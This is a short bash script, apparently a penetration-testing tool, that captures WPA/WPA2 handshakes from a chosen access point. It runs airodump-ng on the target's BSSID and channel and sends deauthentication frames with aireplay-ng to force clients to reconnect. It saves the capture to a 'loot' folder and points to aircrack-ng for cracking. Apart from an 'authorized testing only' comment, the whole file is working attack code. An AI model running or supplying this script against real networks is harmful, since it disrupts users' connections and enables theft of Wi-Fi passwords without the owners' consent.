#!/bin/bash
# WPA/WPA2 Handshake Capture
# Author: David Osisek
# FOR AUTHORIZED TESTING ONLY

echo "[+] WPA/WPA2 Handshake Capture"
echo "[*] Enter target BSSID (AP MAC):"
read BSSID
echo "[*] Enter channel:"
read CHANNEL

if [ -z "$BSSID" ] || [ -z "$CHANNEL" ]; then
    echo "[-] Missing parameters"
    exit 1
fi

OUTPUT="/root/loot/handshake-$(echo $BSSID | tr ':' '-')"
mkdir -p /root/loot

echo "[+] Configuration:"
echo "    BSSID: $BSSID"
echo "    Channel: $CHANNEL"
echo "    Output: $OUTPUT"

# Set channel
echo "[*] Setting channel..."
iwconfig wlan1mon channel $CHANNEL

# Start capture
echo "[+] Starting capture..."
airodump-ng --bssid $BSSID --channel $CHANNEL -w $OUTPUT wlan1mon &
CAPTURE_PID=$!

sleep 5

# Deauth to force handshake
echo "[*] Sending deauth to force handshake..."
aireplay-ng --deauth 10 -a $BSSID wlan1mon

echo "[*] Capturing for 60 seconds..."
sleep 60

# Stop capture
kill $CAPTURE_PID

echo "[+] Capture complete"
echo "[*] Check for handshake: aircrack-ng $OUTPUT-01.cap"
